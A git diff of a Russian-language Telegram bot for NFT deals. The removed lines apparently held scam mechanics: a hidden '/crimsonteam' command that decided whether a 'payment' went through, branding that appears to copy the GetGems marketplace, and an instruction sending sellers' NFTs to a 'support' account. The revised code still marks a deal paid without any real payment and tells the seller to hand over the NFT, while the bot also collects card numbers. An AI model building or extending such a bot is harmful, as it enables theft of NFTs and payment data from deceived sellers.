@@ -4,6 +4,7 @@ const fs = require('fs');
 const path = require('path');
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
+
 if (!BOT_TOKEN) {
   console.log('❌ Нет BOT_TOKEN');
   process.exit();
@@ -13,15 +14,17 @@ const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
 console.log('🤖 Bot started');
 
-// ===== DATA =====
+// ====== ADMIN ======
+const ADMIN_IDS = [123456789]; // <-- ВСТАВЬ СВОЙ TELEGRAM ID
+
+// ====== DATA ======
 const DATA_FILE = path.join(__dirname, 'data.json');
 
 let deals = new Map();
 let users = new Map();
 let sessions = new Map();
-let adminMode = false;
 
-// ===== LOAD / SAVE =====
+// ====== LOAD / SAVE ======
 function loadData() {
   if (!fs.existsSync(DATA_FILE)) return;
   const data = JSON.parse(fs.readFileSync(DATA_FILE));
@@ -32,14 +35,14 @@ function loadData() {
 function saveData() {
   const data = {
     deals: [...deals],
-    users: [...users],
+    users: [...users]
   };
   fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
 }
 
 loadData();
 
-// ===== HELPERS =====
+// ====== HELPERS ======
 function generateId() {
   return Math.random().toString(36).substring(2, 8).toUpperCase();
 }
@@ -62,7 +65,7 @@ function currencyKeyboard() {
       keyboard: [
         ['TON', 'USD'],
         ['RUB', 'EUR'],
-        ['STARS']
+        ['UAH', 'STARS']
       ],
       resize_keyboard: true,
       one_time_keyboard: true
@@ -70,13 +73,7 @@ function currencyKeyboard() {
   };
 }
 
-// ===== ADMIN =====
-bot.onText(/\/crimsonteam/, (msg) => {
-  adminMode = !adminMode;
-  bot.sendMessage(msg.chat.id, `⚙ Админ режим: ${adminMode ? 'ВКЛЮЧЕН' : 'ВЫКЛЮЧЕН'}`);
-});
-
-// ===== START =====
+// ====== START ======
 bot.onText(/\/start(?: (.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
@@ -89,37 +86,40 @@ bot.onText(/\/start(?: (.+))?/, async (msg, match) => {
   const payload = match[1];
 
   if (!payload) {
-    return bot.sendMessage(chatId, '👋 Добро пожаловать на GET GEMS-NFT DEALS', mainMenu());
+    return bot.sendMessage(chatId, '👋 Добро пожаловать в NFT Deals Bot', mainMenu());
   }
 
   if (payload.startsWith('deal_')) {
     const dealId = payload.replace('deal_', '');
     const deal = deals.get(dealId);
 
-    if (!deal) return bot.sendMessage(chatId, '❌ Сделка не найдена');
+    if (!deal)
+      return bot.sendMessage(chatId, '❌ Сделка не найдена');
 
     return bot.sendMessage(chatId,
 `📝 Сделка #${deal.id}
 💰 ${deal.amount} ${deal.currency}
 📝 ${deal.description}
-
-`,
+🔗 NFT: ${deal.nft}
+Статус: ${deal.status}`,
 {
   reply_markup: {
     inline_keyboard: [
-      [{ text: '💳 Оплатить', callback_data: `pay_${deal.id}` }]
+      deal.status === 'pending'
+        ? [{ text: '💳 Оплатить', callback_data: `pay_${deal.id}` }]
+        : []
     ]
   }
 });
   }
 });
 
-// ===== PROFILE =====
+// ====== PROFILE ======
 bot.onText(/👤 Профиль/, (msg) => {
   const user = users.get(msg.from.id);
 
   bot.sendMessage(msg.chat.id,
-`👤 Ваш профиль:
+`👤 Профиль:
 
 TON: ${user.ton || '❌ Не добавлен'}
 Карта: ${user.card || '❌ Не добавлена'}`,
@@ -145,14 +145,14 @@ bot.onText(/Добавить карту/, (msg) => {
   bot.sendMessage(msg.chat.id, 'Введите номер карты:');
 });
 
-// ===== CREATE DEAL =====
+// ====== CREATE DEAL ======
 bot.onText(/➕ Создать сделку/, (msg) => {
   sessions.set(msg.from.id, { step: 'currency' });
   bot.sendMessage(msg.chat.id, 'Выберите валюту:', currencyKeyboard());
 });
 
-// ===== CALLBACKS =====
-bot.on('callback_query', (query) => {
+// ====== CALLBACKS ======
+bot.on('callback_query', async (query) => {
   const data = query.data;
   const userId = query.from.id;
 
@@ -160,19 +160,21 @@ bot.on('callback_query', (query) => {
     const dealId = data.replace('pay_', '');
     const deal = deals.get(dealId);
 
-    if (!adminMode) {
-      return bot.answerCallbackQuery(query.id, { text: '❌ Оплата не произведена', show_alert: true });
-    }
+    if (!deal)
+      return bot.answerCallbackQuery(query.id, { text: '❌ Сделка не найдена', show_alert: true });
+
+    if (deal.status !== 'pending')
+      return bot.answerCallbackQuery(query.id, { text: '❌ Сделка уже оплачена', show_alert: true });
 
     deal.status = 'paid';
     deal.buyer = userId;
     saveData();
 
-    bot.sendMessage(deal.seller,
+    await bot.sendMessage(deal.seller,
 `💰 Покупатель оплатил сделку #${deal.id}
-Передайте NFT в поддержку @get_gemssupport.`);
+Передайте NFT покупателю.`);
 
-    bot.sendMessage(userId,
+    await bot.sendMessage(userId,
 `💳 Вы оплатили сделку #${deal.id}`,
 {
   reply_markup: {
@@ -181,24 +183,45 @@ bot.on('callback_query', (query) => {
     ]
   }
 });
+
+    return bot.answerCallbackQuery(query.id);
   }
 
   if (data.startsWith('confirm_')) {
     const dealId = data.replace('confirm_', '');
     const deal = deals.get(dealId);
 
+    if (!deal)
+      return bot.answerCallbackQuery(query.id, { text: '❌ Сделка не найдена', show_alert: true });
+
+    if (deal.buyer !== userId)
+      return bot.answerCallbackQuery(query.id, { text: '❌ Это не ваша сделка', show_alert: true });
+
+    if (deal.status !== 'paid')
+      return bot.answerCallbackQuery(query.id, { text: '❌ Оплата ещё не подтверждена', show_alert: true });
+
     deal.status = 'completed';
     saveData();
 
-    bot.sendMessage(deal.seller, `✅ Сделка #${deal.id} завершена`);
-    bot.sendMessage(userId, `🎉 Сделка завершена`);
+    await bot.sendMessage(deal.seller, `✅ Сделка #${deal.id} завершена`);
+    await bot.sendMessage(userId, `🎉 Сделка завершена`);
+
+    return bot.answerCallbackQuery(query.id);
   }
 });
 
-// ===== MESSAGE HANDLER =====
+// ====== MESSAGE HANDLER ======
 bot.on('message', async (msg) => {
+  if (!msg.text) return;
+  if (msg.text.startsWith('/')) return;
+
+  if (msg.text === '⬅ Назад') {
+    sessions.delete(msg.from.id);
+    return bot.sendMessage(msg.chat.id, 'Главное меню', mainMenu());
+  }
+
   const session = sessions.get(msg.from.id);
-  if (!session || !msg.text) return;
+  if (!session) return;
 
   const user = users.get(msg.from.id);
 
@@ -221,7 +244,8 @@ bot.on('message', async (msg) => {
   // Валюта
   if (session.step === 'currency') {
     const currency = msg.text.toUpperCase();
-    const needsCard = ['USD', 'RUB', 'EUR'];
+    const needsCard = ['USD', 'RUB', 'EUR', 'UAH'];
+
     if (currency === 'TON' && !user.ton)
       return bot.sendMessage(msg.chat.id, '❌ Добавьте TON в профиле');
 
@@ -233,18 +257,26 @@ bot.on('message', async (msg) => {
     return bot.sendMessage(msg.chat.id, 'Введите сумму:');
   }
 
+  // Сумма
   if (session.step === 'amount') {
-    session.amount = msg.text;
+    const amount = parseFloat(msg.text);
+
+    if (isNaN(amount) || amount <= 0)
+      return bot.sendMessage(msg.chat.id, '❌ Введите корректную сумму');
+
+    session.amount = amount;
     session.step = 'description';
     return bot.sendMessage(msg.chat.id, 'Введите описание:');
   }
 
+  // Описание
   if (session.step === 'description') {
     session.description = msg.text;
     session.step = 'nft';
     return bot.sendMessage(msg.chat.id, 'Отправьте ссылку на NFT:');
   }
 
+  // NFT
   if (session.step === 'nft') {
     const dealId = generateId();
     const me = await bot.getMe();
